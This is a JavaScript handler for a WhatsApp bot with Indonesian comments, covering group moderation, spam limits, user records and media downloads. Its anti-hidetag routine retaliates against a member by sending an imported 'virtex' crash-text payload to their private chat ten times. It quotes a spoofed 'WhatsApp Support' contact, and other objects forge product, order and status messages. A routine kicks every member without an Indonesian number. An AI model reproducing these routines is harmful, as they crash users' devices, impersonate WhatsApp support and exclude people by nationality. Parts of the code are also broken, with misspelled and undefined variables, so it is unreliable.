"use strict";
const {
  proto,
  prepareWAMessageMedia,
  generateWAMessageFromContent, 
  getContentType} = require("@adiwajshing/baileys") 
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn } = require("child_process");
const axios = require("axios");
const emoji  = require("emoji-api");
//const emoji = new EmojiAPI()
const yts = require("yt-search");
const speed = require("performance-now");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const os = require('os');
const { performance } = require('perf_hooks')
const fetch = require('node-fetch');
const cheerio = require( 'cheerio')
const request = require("request")


//----------------- LIB FILE ------------------\\
const { msgFilter, addSpam, SpamExpired, cekSpam} = require('../lib/antispam')
const { color } = require('../lib/color')
const {formatp,parseMention, getRandom,generateProfilePicture, getCase,runtime,FileSize,h2k, makeid,kyun,randomNomor,jsonformat, isUrl, fetchJson, sleep,getBuffer,} = require("../lib/myfunc");
const {TelegraPh} = require('../lib/uploader')
const { igdl, ghstalk,facebook, kodepos, moddroid, apkmody, happymod, wallpaper, wikimedia, quotesAnime, aiovideodl  } = require('../lib/scraper') 
const { addblockcmd, deleteblockcmd, checkblockcmd } = require("../lib/blockcmd");
const { addError,clearAllError, deleteError, checkError } = require("../lib/totalerror")
const { Nothing,Failed,Succes,addAutoClear,autoClearChat, checkDataName, createDataId, addDataId, removeDataId, checkDataId, getHit, cmdAdd, expiredCmd } = require("../lib/totalcmd");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const { clearAllBan, addBanned, unBanned, cekBannedUser } = require("../lib/banned")

//Database
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd 
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard 
const anonChat = db.data.anonymous 
const allcommand = db.data.allcommand 
const sewa = db.data.sewa
const spammer = []
const pendaftar = JSON.parse(fs.readFileSync('./user.json'))
//------------------ VIRTEX FILE ------------------\\
//virtex by tsukasa
const { virtex8 } = require('./virtex.js')
const thumb = fs.readFileSync('./stik/thumb.jpeg')
var publik = true


//=================================================//
module.exports = async(conn, dev, chatUpdate, store) => {
//Log(chatUpdate.messages[0].message)

const m = dev
var Ownerin ="6281316701742@s.whatsapp.net"
var ownerNumber = [`${nomerOwner}@s.whatsapp.net` ,`${nomerOwner2}@s.whatsapp.net`,`6281266891985@s.whatsapp.net`,`${conn.user.jid}`]
const Tnow = (new Date()/1000).toFixed(0)
const seli = Tnow - m.messageTimestamp.low
if (seli > Intervalmsg) return console.log(new ReferenceError(`Pesan ${Intervalmsg} detik yang lalu diabaikan agar tidak nyepam`))
//if(m.chat !== Ownerin) return
try {

const { type, now,args, sender, fromMe,from,botNumber,senderNumber,groupName,groupId,groupMembers,groupDesc,groupOwner,pushname,itsMe,isGroup,mentionByTag,mentionByReply,users,budy,content,body, } = dev


if (multi){
var prefix = /^#.!¦|\\^/.test(body) ? body.match(/^#.!¦|\\^/gi) : '.'
var thePrefix = "Multi Prefix"
}                        

const isCmd = body.startsWith(prefix)
const isCommand = isCmd? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() :""
const q = args.join(' ')
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = ownerNumber.includes(sender) || checkDataId ("owner", sender, DataId) 
const command = isOwner? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
const theOwner = sender == Ownerin 
const timestampp = speed();
const latensi = speed() - timestampp
const quoted = dev.quoted ? dev.quoted : dev
const mime = (quoted.msg || quoted).mimetype || ''
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
const replyCommand = isCmd? isCmd : allcommand.includes(toFirstCase(command))
const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
//Bot hanya merespon jika button miliknya saja yang di tekan 
if(isGroup && (type == 'buttonsResponseMessage' && dev.message.buttonsResponseMessage.contextInfo.participant !== botNumber
|| type == 'templateButtonReplyMessage' && dev.message.templateButtonReplyMessage.contextInfo.participant !== botNumber
|| type == 'listResponseMessage' && dev.message.listResponseMessage.contextInfo.participant !== botNumber)) {return}
require("./message.js")(senderNumber, prefix,command)
const user = db.data.users[m.sender]
const isUser = pendaftar.includes(m.sender)
const chat = db.data.chats[m.chat]
conn.readMessages([m.key])




 
   
  
  






if (user) {
if (!('name' in user)) user.name = pushname
if (!('id' in user)) user.id = senderNumber
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.hit)) user.hit = 1
if (!isNumber(user.balance)) user.balance = 1000
if (!isNumber(user.limit)) user.limit = 30
if (!isNumber(user.glimit)) user.glimit = 30
if (!('serial' in user)) user.serial = makeid(4)
if (!isNumber(user.afk)) user.afk = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.pc)) user.pc = 0
if (!('autolevelup' in user)) user.autolevelup = false
if (!isNumber(user.pc)) user.pc = 0
if (!user.grade) user.grade = 'Newbie'

} else {
global.db.data.users[sender] = {
name: pushname,
id: senderNumber,
date: calender,
exp: 100,
level: 1,
hit: 0,
balance: 1000,
limit: 30,
glimit: 30,
serial: makeid(4).toUpperCase(),
lastclaim: 0,
afk: -1,
pc: 0,
grade: 'Newbie',
autolevelup: false 
}

}


//if (typeof chat !== 'object') global.db.data.chats[m.chat] = {}
if (isGroup && chat) {
if (!('name' in chat)) chat.name = groupNmae
if (!isNumber(chat.add)) chat.add = 0
if (!('welcome' in chat)) chat.welcome = true
if (!('detect' in chat)) chat.detect = true
if (!('sWelcome' in chat)) chat.sWelcome = ''
if (!('sBye' in chat)) chat.sBye = ''
if (!('sPromote' in chat)) chat.sPromote = ''
if (!('sDemote' in chat)) chat.sDemote = ''
if (!('desc' in chat)) chat.desc = true
if (!('descUpdate' in chat)) chat.descUpdate = true
if (!('stiker' in chat)) chat.stiker = false
if (!('antiLink' in chat)) chat.antiLink = true
if (!isNumber(chat.expired)) chat.expired = 0
if (!('antiBadword' in chat)) chat.antiBadword = true
if (!('antispam' in chat)) chat.antispam = true
if (!('antitroli' in chat)) chat.antitroli = false
if (!('antivirtex' in chat)) chat.antivirtex = false
if (!('viewonce' in chat)) chat.viewonce = true
if (!('nsfw' in chat)) chat.nsfw = false
if (!('clear' in chat)) chat.clear = false
if (!isNumber(chat.cleartime)) chat.clearTime = 0
} else if (isGroup) global.db.data.chats[m.chat] = {
name: groupName,
add: 0,
welcome: true,
detect: true,
sWelcome: '',
sBye: '',
sPromote: '',
sDemote: '',
desc: true,
descUpdate: true,
autostiker: false,
antilink: false,
antilinkgc: false,
antidelete: false,
antiasing: false,
banchat: false,
expired: 0,
antibadword: true,
antispam: true,
antitroli: false,
antivirtex: false,
antihidetag: false,
viewonce: true,
nsfw: false,
clear: false,
clearTime: 0
}
const ments = async(query) => query.match('@') ? [...query.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
//Security / Keamanan
const isBotGroupAdmins = isGroup ? m.isBotAdmin : false
const isGroupOwner = isGroup ? m.isRAdmin : false
const isGroupAdmins = isGroup ? m.isAdmin : false
const isAntiLink = isGroup ? db.data.chats[from].antilink : false
const isAntidelete = isGroup ? db.data.chats[from].antidelete : false
const isKickarea = isGroup ? db.data.chats[from].antiasing : false
const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
const isBanchat = isGroup ? db.data.chats[from].banchat : false 
const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
const isAntihidetag = isGroup ? db.data.chats[from].antihidetag : false
const isBanned = sender? cekBannedUser (senderNumber, ban) : false
const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
const gcount = isPremium ? gcounti.prem : gcounti.user
//const isHit = db.data.users[sender].hit > 1? true : false 
  

// Presence Online
if (isCmd){
conn.sendPresenceUpdate('composing', from)
} else {
conn.sendPresenceUpdate('available', from)
}
if (m.message && !isUser) {
var esde =`Halo kak *${pushname}*\nKamu Sepertinya pengguna baru\nApakah kamu Butuh Bantuan?`
let bono = {
text: esde,
footer: copyright,
templateButtons: [{urlButton: {displayText: 'Tutorial', url: 'https://tutorial.satganzdevs.repl.co'}}]
}
conn.sendMessage(from, bono, {quoted:m})
			pendaftar.push(m.sender)
			fs.writeFileSync('./user.json', JSON.stringify(pendaftar, null, 2))
		}
  //Ucapan Waktu  
if(timeWib < "23:59:00"){ var ucapanWaktu = 'Selamat malam' }
if(timeWib < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'Selamat siang'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'  }      
    
    

//FAKE REPLY  
const ftoko = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync('./stik/quoted.jpg')},"title": `${pushname}`,"description": `${ucapanWaktu} kak`,"currencyCode": "IDR", "priceAmount1000": `${pushname}`, "retailerId": `Rp10`,"productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
const ftext = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/reply.jpg')}}}
const ftroli = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 200, status: 1,surface : 2,message: `${fake}\n${ucapanWaktu} kak`,orderTitle: `${ucapanWaktu} kak`,thumbnail: fs.readFileSync('./stik/quoted.jpg'), sellerJid: `0@s.whatsapp.net`}}}
const floc = { key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,'jpegThumbnail': fs.readFileSync('./stik/quoted.jpg')}}}
const fimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: {"imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./stik/quoted.jpg'), "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: { title: 'Halo bang', jpegThumbnail: fs.readFileSync('./stik/quoted.jpg')}}}
//bug kontak
const lep = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"contactMessage": {
"displayName": "WhatsApp Support",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6288226703423:+62 882-2670-3423\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"
}}}

  
//Set Quoted
if(Qoted === "ftoko"){
var setQuoted = ftoko
} else if(Qoted === "fkontak"){
var setQuoted = fkontak
} else if(Qoted === "ftext"){
var setQuoted = ftext
}else if(Qoted === "ftroli"){
var setQuoted = ftroli
} else if(Qoted === "floc"){
var setQuoted = floc
} else if(Qoted === "fimage"){
var setQuoted = fimage
} else if(Qoted === "dev"){
var setQuoted = dev
} else if(Qoted === "fdoc"){
var setQuoted = fdoc
}


 //SetReply
const setReply = async(result) =>{ 
let translate = require('@vitalets/google-translate-api');
if(language == "id"){
if(!sender.startsWith("62")){
let tld = 'cn'
let toks =  translate(result, {to: "en",})
var teks = toks.text
} else {
var teks = result
}

} else {
let toks =  translate(result, {to: "en",})
var teks = toks.text
} 
	
if(replyType === "web"){

conn.sendMessage(from, { id: m.key.id, contextInfo: { mentionedJid: [...teks.matchAll(/@(\d{0,16})/g)].map(v => v[1]+'@s.whatsapp.net'),  forwardingScore: 10, isForwarded: true, externalAdReply:{showAdAttribution: true, title: `${botName}`,body:`Runtime ${runtime(process.uptime())} `,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'),mediaUrl: "https://g.satganzdevs.repl.co",sourceUrl: "https://g.satganzdevs.repl.co"}},showAdAttribution: true, text: teks }, { quoted: dev })
} else if(replyType === "mess"){
conn.sendMessage(from, {text: teks}, { quoted: dev });
} else if(replyType === "quoted"){
conn.sendMessage(from,{ text: teks}, { quoted: setQuoted });
} else if(replyType === "troli"){
let template = await generateWAMessageFromContent(from, {
'orderMessage': {
'orderId': '62887435047326@s.whatsapp.net',
'thumbnail': fs.readFileSync('./stik/reply.jpg'),
'itemCount': "2022",
'title': "title",
'description': "description",
'status': 1,
'surface': 1,
'message':teks,
'orderTitle': fake
}
}, {
'quoted': dev
});
 conn.relayMessage(from, template.message,{ messageId: template.key.id })                   
} else {
conn.sendMessage(from, {text: "Error SetReply Tidak Di Temukan"})
}
}


// Public & Self And Banchat
if (!publik && !itsMe && !isOwner && !theOwner) return 
if (isGroup && isBanchat) {
if (!itsMe && !isOwner) return 
}

function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}	
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: dev })
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  conn.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  conn.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: dev})
}
const math = (teks) => {
return Math.floor(teks)
}  
const sendGif = (teks, teksnya) => {
conn.sendMessage(from, { video: teks, caption: "Nih!",gifPlayback: true},{quoted: dev})
};
const send5ButMsg = (jid, text = '' , footer = '', but = []) =>{
        let templateButtons = but
        var templateMessage = {
        text: text,
        footer: footer,
        templateButtons: templateButtons
        }
        conn.sendMessage(jid, templateMessage)
        }
const copyNForward = (jid = from, forceForward = false, options = {}) => conn.copyNForward(jid, mess, forceForward, options)
//onlyOwner
  const onlyOwner = async() =>{
setReply(mess.only.ownerB)
}



//-------------------- 》SECURITY《 ------------------\\
//Anti Hidetag
if(budy.startsWith(`${prefix}hidetag`) && isAntihidetag){
if(isGroupAdmins) await conn.groupParticipantsUpdate(from, [sender], 'demote')
for (let i = 0; i < 10; i++) {
await conn.sendKatalog(sender, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
await conn.sendMessage(sender, { text: "awowkwkwk" }, { quoted: a });
await conn.sendMessage(sender, { text: "awowkwkwk" }, { quoted: lep });
await sleep(1000)
}
}
  
 //ANTI LINK GROUP
if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
await setReply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
await sleep(3000)
if(isBotGroupAdmins) await conn.sendMessage(from, { delete: m.key })
await conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}   

  
 //ANTI LINK 
if (isGroup && isAntiLink){
if (budy.includes(`https:`)) { 
if (isGroupAdmins) return setReply('Alah sia admin grup mah bebas yekan :v')
if(ownerNumber.includes(sender)) return setReply('Alah sia owner bot mah bebas yekan :v')
let linkgc = await conn.groupInviteCode(from)
if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
if (budy.includes('zin admin') || budy.includes('zinmin') )return setReply('Izin Admin diterima')
setReply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
setTimeout(() => {
if(isBotGroupAdmins) conn.sendMessage(from, { delete: m.key })
conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => { setReply(`BOT HARUS JADI ADMIN`) })
}, 2000)
}
}

 //ANTI ASING/BULE OK
if (isGroup && isBotGroupAdmins &&isKickarea && !itsMe) {    
let member = await groupMembers.map(u => u.id)
for ( let i = 0; i <member.length; i++){  
if (member[i].slice(0,2) !== "62" ){     	
let usersId = await groupMembers.find(u => u.id == member[i]) 
if (!usersId.groupAdmins ){
await conn.groupParticipantsUpdate(from, [member[i]], 'remove')
await sleep(1000)
}
}
} 
}  

//ANTI VIRUS
if (isGroup && isAntiVirtex && budy.length > 20000) {
if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
const antivirus  = require('./antivirus.js')  
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
await conn.sendMessage(from, {text:antivirus(pushname,groupName)})
if (!isBotGroupAdmins) {return }
if(isOwner) {return}
await conn.groupParticipantsUpdate(from, [sender], 'remove')
await conn.sendMessage(`${nomerOwner}@s.whatsapp.net`,{text: `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`})
 }

  
 //ANTI DELETE
if(type == 'protocolMessage' && isAntidelete){
let mess = chatUpdate.messages[0].message.protocolMessage
let chats = Object.entries(await conn.chats).find(([user, data]) => data.messages && data.messages[mess.key.id])
if(chats[1] !== undefined){
let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]))
let ahpus = await conn.copyNForward(mess.key.remoteJid, msg, true, msg.quoted && msg.quoted.fromMe
                ? {
                    contextInfo: {
                      ...msg.msg.contextInfo,
                      forwardingScore: 0,
                      isForwarded: true,
                      participant: m.sender,
                    },
                  }
                : {}
            )
let Type = getContentType(ahpus)
await conn.sendMessage(from, { id: m.key.id, contextInfo: {   forwardingScore: 10, isForwarded: true, externalAdReply:{showAdAttribution: true, title: `${baileysVersion}`,body:`Runtime ${runtime(process.uptime())} `,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'),mediaUrl: "https://g.satganzdevs.repl.co",sourceUrl: "https://g.satganzdevs.repl.co"}},showAdAttribution: true, text: `┌〔 ANTI DELETE 〕
│ 
├ DARI: @${m.sender.split('@')[0]}
├ WAKTU: ${timeWib}
│ 
└────`}, { mentions: [mess.key.participant], quoted: dev })
}
}
// -------[ ANTI BADWORD ]------- \\
        if (isGroup) {
        let badwordRegex = /anj(k|g)|ajn?(g|k)|a?njin(g|k)|bajingan|b(a?n)?gsa?t|ko?nto?l|me?me?(k|q)|pe?pe?(k|q)|meki|titi(t|d)|pe?ler|tetek|toket|ngewe|go?blo?k|to?lo?l|idiot|(k|ng)e?nto?(t|d)|jembut|bego|dajj?al|janc(u|o)k|pantek|puki ?(mak)?|kimak|kampang|lonte|col(i|mek?)|pelacur|henceu?t|nigga|fuck|dick|bitch|tits|bastard|asshole|pntk|shit|dick/i // tambahin sendiri
		let isBadword = badwordRegex.test(budy.toLowerCase())
		if (isBadword) {
		var hapus = m.key.participant
		var bang = m.key.id
        setReply(pickRandom(['jaga ketikannya','Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']))
        await sleep(300)
		conn.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }})
		}
		}  
  

  
  //========================================================================================================================//
let colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isText = (type == 'conversation')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')



const addSpammer = function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
_db[position].spam += 1
 } else {
let bulin = ({ id: jid, spam: 1 })
 _db.push(bulin)     
}
}

const FinisHim = async function(jid, _db){
let position = false
Object.keys(_db).forEach((i) => {
if (_db[i].id === jid) {
position = i
}
})
if (position !== false) {
if(_db[position].spam > 7){
if(db.data.users[sender].banned.status || !isOwner){return}
let obj = {
id: senderNumber,
status: true,
date: calender,
reason: "Spam Bot"
}
db.data.users[woke].banned = obj               
console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
setReply("Kamu telah di banned karena telah melakukan spam")
}
} else {
console.log(`Spam ke ${_db[position].spam}`)
}
}

  


  
//ANTI SPAM BERAKHIR
if(SpamExpired(senderNumber, "Case", AntiSpam)){
let position = false
for(let i of spammer){
if(i.id == senderNumber){
position = i
}
}
    
if (position !== false) {
spammer.splice(position, 1)
console.log(chalk.bgGreen(color("[  Remove ]", "black")),"Sukses remove spammer")
}
}


SpamExpired(senderNumber, "NotCase", AntiSpam)
if(isBanned && !isOwner){return} //user terbanned
if(isCmd && cekSpam("Case",senderNumber, AntiSpam)){
addSpammer(senderNumber, spammer)
FinisHim(senderNumber, spammer)
console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")),"antispam Case aktif")
return
}

//ANTI SPAM PRIVATE CHAT
if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner ) {
addSpam("Case",senderNumber, "15 s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}

//ANTI SPAM GROUP CHAT     
if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
addSpam("Case",senderNumber, "15s", AntiSpam)
addSpammer(senderNumber, spammer)
return setReply("Beri bot waktu jeda 5 detik")
}
if (isCmd && !isOwner) msgFilter.addFilter(from)






//System Expired
_sewa.expiredCheck(conn, sewa)
_prem.expiredCheck(premium) 
//autoClearChat(conn,clearchat)

//Make Sticker
async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
}

		
//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4') 
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await conn.sendMessage(from, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: dev})
fs.unlinkSync(`./${mp4File}`)
})     
} catch(err) {
setReply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
await conn.sendMessage(from, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mpeg' },{ quoted: dev })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(color(err))
}
} 

//SOUND CLOUD DOWNLOAD MP3
const scdlMp3 = async (Link ) => {
const CuteFFMPEG = require("cute-ffmpeg").CuteFFMPEG;
const FFMPEGRequest = require("cute-ffmpeg").FFMPEGRequest;
const Ffmpeg = new CuteFFMPEG({
overwrite: true
});
let { SoundCloud } = require("scdl-core");
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = getRandom('.mp3') 
let opusFile = `${track.title}.opus`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {   
	
let request = new FFMPEGRequest({
input: {
path: mp3File
},
output: {
path: opusFile,
bitrate: 128
}
});

Ffmpeg.convert(request)
.then( async filePath => {
  // Done
await conn.sendMessage(from, {contextInfo: {
externalAdReply: {
title: 'Speed', 
body: 'Now Playing...',
description: 'Now Playing...',
mediaType: 2,
thumbnail: await (await fetch('https://telegra.ph/file/76f08bd0aeb06c3e0c0d5.jpg')).buffer(),
mediaUrl: `https://youtube.com/watch?v=uIedYGN3NQQ`
}
}, audio:  fs.readFileSync(filePath), mimetype: 'audio/mp4' },{ quoted: dev })
fs.unlinkSync(mp3File)
fs.unlinkSync(opusFile)
})
.catch(error => {
setReply(error)
})
})     
}



//SOUND CLOUD DOWNLOAD MP3 DOCUMENT
const scdlDoc= async (Link ) => {
let { SoundCloud } = require("scdl-core");
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(Link);
let mp3File = `./${track.title}.mp3`
let stream = await scdl.download(Link)
stream.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await conn.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' },{ quoted: dev })
fs.unlinkSync(mp3File)
})       
}  

//Console Log
try{
var virus = m.message.extendedTextMessage.contextInfo.externalAdReply.title.length
}catch{
var virus = 100
}

if(type == "groupInviteMessage" && m.message.groupInviteMessage.caption.length > 8000||  type == "contactMessage" && m.message.contactMessage.displayName.length > 8000 || type == "imageMessage" && m.message.imageMessage.caption.length > 8000 || budy.length > 8000 && !itsMe  || type == "extendedTextMessage" && virus > 8000 && !itsMe ||  type == "productMessage" && m.message.productMessage.product.description.length > 8000 && !itsMe ||  type == "listMessage" && !itsMe) {
if(isGroup && isBotGroupAdmins) conn.sendMessage(from, { delete: m.key})
if(!isGroup) conn.chatModify({ clear: { messages: [{ id: m.id, fromMe: sender == botNumber? true : false, timestamp: m.messageTimestamp }] } }, sender, [])
console.log(chalk.bgRedBright(color("[ VIRTEXT ]", "black")),`Length: ${budy.length} from ${senderNumber} ${isGroup? `Group ${groupName}`: ""}`)
}
